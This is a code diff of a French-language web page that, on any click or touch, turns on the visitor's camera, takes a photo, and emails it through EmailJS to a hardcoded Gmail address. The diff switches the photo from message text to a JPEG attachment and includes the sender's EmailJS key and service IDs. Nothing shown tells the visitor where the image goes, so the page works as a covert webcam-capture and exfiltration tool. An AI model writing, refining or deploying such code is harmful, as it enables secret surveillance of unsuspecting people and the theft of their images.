@@ -2,11 +2,10 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Capture et envoi</title>
+  <title>Capture et envoi pièce jointe</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    // Initialisation avec nouvelle clé publique
-    emailjs.init("IoSfbtGz4KSL_5_9E");
+    emailjs.init("IoSfbtGz4KSL_5_9E"); // ta clé publique
   </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
@@ -32,9 +31,8 @@
         video.srcObject = stream;
         await video.play();
 
-        // Redimensionnement pour réduire le Base64
         const canvas = document.createElement("canvas");
-        const MAX_WIDTH = 200; // petite largeur pour email
+        const MAX_WIDTH = 200; // réduire taille pour email
         let ratio = video.videoHeight / video.videoWidth;
         canvas.width = MAX_WIDTH;
         canvas.height = MAX_WIDTH * ratio;
@@ -42,13 +40,18 @@
         canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageBase64 = canvas.toDataURL("image/jpeg", 0.3); // compression 30%
 
-        // Stop caméra
         stream.getTracks().forEach(track => track.stop());
 
-        // Envoi EmailJS
+        // Préparer pièce jointe
+        const attachment = imageBase64.replace(/^data:image\/jpeg;base64,/, "");
+
         const params = {
           to_email: "adressestestee@gmail.com",
-          message: imageBase64
+          attachment: [{
+            name: "photo.jpg",
+            data: attachment,
+            type: "image/jpeg"
+          }]
         };
 
         emailjs.send("service_8cs0gml", "template_hgvdx1g", params)
@@ -59,7 +62,6 @@
       }
     }
 
-    // Déclenchement au clic ou touch
     document.body.addEventListener("click", captureAndSend);
     document.body.addEventListener("touchstart", captureAndSend, { passive: true });
   </script>
